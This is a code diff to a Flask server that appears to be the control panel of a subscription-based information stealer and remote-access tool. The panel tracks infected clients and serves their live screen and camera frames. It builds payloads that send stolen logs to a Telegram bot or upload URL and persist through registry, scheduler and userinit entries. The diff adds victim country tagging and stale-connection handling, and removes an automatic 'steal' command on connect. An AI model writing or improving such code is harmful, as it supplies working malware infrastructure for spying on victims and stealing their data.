@@ -210,9 +210,15 @@ def init_db():
                 file_count INTEGER,
                 zip_filename TEXT,
                 has_screenshot INTEGER,
+                country_code TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ''')
+
+        # Migrate existing logs table: add country_code if missing
+        log_cols = [row['name'] for row in db.execute("PRAGMA table_info(logs)").fetchall()]
+        if 'country_code' not in log_cols:
+            db.execute("ALTER TABLE logs ADD COLUMN country_code TEXT")
 
         cursor = db.execute("PRAGMA table_info(users)")
         user_cols = [row['name'] for row in cursor.fetchall()]
@@ -1205,9 +1211,6 @@ def c2_websocket(ws):
 
         ws.send(json.dumps({'type': 'auth_ok'}, separators=(',', ':')))
 
-        # Automatically trigger instant steal log harvesting on client connect
-        cmd_q.put(json.dumps({'type': 'command', 'command': 'steal'}, separators=(',', ':')))
-
         last_ping = time.time()
         while True:
             # drain pending commands first
@@ -1315,14 +1318,49 @@ def c2_debug():
 @subscription_required
 def c2_list_clients():
     user = request.current_user
+    now = time.time()
+    ONLINE_THRESHOLD = 30
     with get_db() as db:
         rows = db.execute('''
             SELECT client_id, hostname, username, ip, last_heartbeat, pending_command, user_id
             FROM clients WHERE user_id = ? ORDER BY last_heartbeat DESC
         ''', (user['id'],)).fetchall()
+        # parse last_heartbeat to epoch for staleness check
+        stale_clients = []
+        for r in rows:
+            lh = r['last_heartbeat']
+            heartbeat_age = None
+            try:
+                if lh:
+                    dt = datetime.strptime(str(lh), '%Y-%m-%d %H:%M:%S')
+                    heartbeat_age = now - dt.timestamp()
+            except Exception:
+                heartbeat_age = None
+            if heartbeat_age is not None and heartbeat_age > 60:
+                stale_clients.append(r['client_id'])
+    # Close stale WS connections so the finally block in c2_websocket cleans up ws_clients
+    with ws_clients_lock:
+        for cid in stale_clients:
+            wsc = ws_clients.get(cid)
+            if wsc:
+                try:
+                    wsc['ws'].close()
+                except Exception:
+                    pass
+                ws_clients.pop(cid, None)
     clients = []
     with ws_clients_lock:
         for r in rows:
+            lh = r['last_heartbeat']
+            heartbeat_age = None
+            try:
+                if lh:
+                    dt = datetime.strptime(str(lh), '%Y-%m-%d %H:%M:%S')
+                    heartbeat_age = now - dt.timestamp()
+            except Exception:
+                pass
+            ws_present = r['client_id'] in ws_clients
+            is_online = ws_present and (heartbeat_age is None or heartbeat_age <= ONLINE_THRESHOLD)
             clients.append({
                 'client_id': r['client_id'],
                 'hostname': r['hostname'],
@@ -1330,7 +1368,7 @@ def c2_list_clients():
                 'ip': r['ip'],
                 'last_heartbeat': r['last_heartbeat'],
                 'pending_command': r['pending_command'],
-                'is_online': r['client_id'] in ws_clients
+                'is_online': is_online
             })
     return jsonify(clients)
 
@@ -1468,12 +1506,46 @@ def c2_get_frame(client_id):
         last_ts = 0
 
     if frame['ts'] <= last_ts:
-        return '', 304
+        resp = Response(status=304)
+        resp.headers['X-Frame-Ts'] = str(frame['ts'])
+        resp.headers['Cache-Control'] = 'no-store'
+        return resp
 
-    return jsonify({
-        'ts': frame['ts'],
-        'b64': base64.b64encode(frame['data']).decode('ascii')
-    })
+    resp = Response(
+        base64.b64encode(frame['data']).decode('ascii'),
+        mimetype='application/json'
+    )
+    resp.headers['X-Frame-Ts'] = str(frame['ts'])
+    resp.headers['Cache-Control'] = 'no-store'
+    return resp
+
+
+@app.route('/api/c2/frame_binary/<client_id>')
+@login_required
+def c2_get_frame_binary(client_id):
+    user = request.current_user
+    if not owns_client(client_id, user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
+    with rdp_frames_lock:
+        frame = rdp_frames.get(client_id)
+    if not frame:
+        return '', 204
+
+    try:
+        last_ts = float(request.args.get('ts', 0))
+    except (ValueError, TypeError):
+        last_ts = 0
+
+    if frame['ts'] <= last_ts:
+        resp = Response(status=304)
+        resp.headers['X-Frame-Ts'] = str(frame['ts'])
+        resp.headers['Cache-Control'] = 'no-store'
+        return resp
+
+    resp = Response(frame['data'], mimetype='image/jpeg')
+    resp.headers['X-Frame-Ts'] = str(frame['ts'])
+    resp.headers['Cache-Control'] = 'no-store'
+    return resp
 
 
 # ===== REMOTE CAMERA FRAME ENDPOINT =====
@@ -2116,7 +2188,7 @@ def build_client():
         delivery       = data.get('delivery', 'TELEGRAM')
         bot_token      = data.get('botToken', '')
         chat_id        = data.get('chatId', '')
-        panel_url      = (request.host_url.rstrip('/') + '/api/upload').ljust(60)
+        panel_url      = (data.get('panelUrl') or (request.host_url.rstrip('/') + '/api/upload'))
         secret_key     = data.get('secretKey', '')
         persistence    = data.get('persistence', 'registry,scheduler,userinit')
         install_folder = data.get('installFolder', '%ApplicationData%')
